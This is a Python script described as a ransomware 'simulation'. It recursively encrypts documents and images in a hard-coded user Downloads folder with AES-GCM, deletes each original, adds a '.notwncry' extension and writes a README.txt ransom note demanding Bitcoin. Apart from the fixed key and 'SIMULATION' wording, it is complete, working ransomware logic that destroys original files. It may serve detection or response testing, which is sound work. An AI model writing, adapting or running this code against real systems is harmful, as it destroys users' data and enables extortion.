import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Constants (for simulation only, do NOT use in real encryption)
KEY = b'0123456789abcdef'  # 16 bytes for AES-128
NONCE = b'abcdef012345'    # 12 bytes for GCM


def encrypt_file(filepath, key, nonce):
    with open(filepath, 'rb') as f:
        data = f.read()
    encryptor = Cipher(
        algorithms.AES(key),
        modes.GCM(nonce),
        backend=default_backend()
    ).encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    tag = encryptor.tag
    # Create new encrypted filename
    encrypted_filepath = filepath + ".notwncry"
    # Write encrypted data to new file
    with open(encrypted_filepath, 'wb') as f:
        f.write(nonce + tag + ciphertext)
    # Remove original file
    os.remove(filepath)
    print(f"Encrypted: {filepath} -> {encrypted_filepath}")

def encrypt_folder(folder):
    # Track which directories we've already added README.txt to
    readme_added = set()
    
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.lower().endswith((
                '.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png')):
                path = os.path.join(root, file)
                try:
                    encrypt_file(path, KEY, NONCE)
                    
                    # Add README.txt to this directory if we haven't already
                    if root not in readme_added:
                        create_ransom_note(root)
                        readme_added.add(root)
                        
                except Exception as e:
                    print(f"Failed to encrypt {path}: {e}")

def create_ransom_note(directory):
    """Create a README.txt ransom note in the specified directory."""
    readme_path = os.path.join(directory, "README.txt")
    ransom_message = """YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with strong AES-128-GCM encryption.
To recover your files, you need to obtain the decryption key.

File extension: .notwncry

This is a SIMULATION for testing purposes only.
No actual harm has been done to your system.

Contact: simulation@test.local
Payment: 1 Bitcoin (SIMULATION)

Your ID: SIM-12345-ABCDE

Do not attempt to remove this message or modify encrypted files.
"""
    
    try:
        with open(readme_path, 'w') as f:
            f.write(ransom_message)
        print(f"Created ransom note: {readme_path}")
    except Exception as e:
        print(f"Failed to create ransom note in {directory}: {e}")

def main():
    #folder = input("Enter folder to encrypt: ").strip()
    # Folder to encrypt: C:\Users\JakeClark\Downloads\snapshot_2025-03-15_15-57
    folder = "C:\\Users\\JakeClark\\Downloads\\snapshot_2025-03-15_15-57"  # Change as needed
    if not os.path.isdir(folder):
        print(f"Folder does not exist: {folder}")
        return
    encrypt_folder(folder)
    print("Encryption simulation complete.")

if __name__ == "__main__":
    main()
